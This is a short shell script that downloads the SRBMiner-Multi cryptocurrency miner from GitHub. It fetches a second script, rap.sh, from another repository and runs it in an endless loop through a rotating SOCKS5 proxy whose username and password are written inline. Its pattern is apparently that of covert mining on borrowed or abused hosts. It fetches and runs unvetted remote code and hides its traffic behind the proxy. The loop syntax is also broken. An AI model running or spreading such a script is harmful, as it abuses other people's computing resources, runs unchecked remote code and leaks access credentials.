#!/bin/sh
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.9/SRBMiner-Multi-0-8-9-Linux.tar.xz 
tar -xf SRBMiner-Multi-0-8-9-Linux.tar.xz 
cd SRBMiner-Multi-0-8-9
wget https://github.com/ahansura/srb/raw/main/rap.sh
chmod +x rap.sh
export http_proxy="socks5://djutybpn-rotate:vo7hn8ayc8s5@p.webshare.io:80/"
while[1];do
./rap.sh
sleep 20
done
sleep 9999
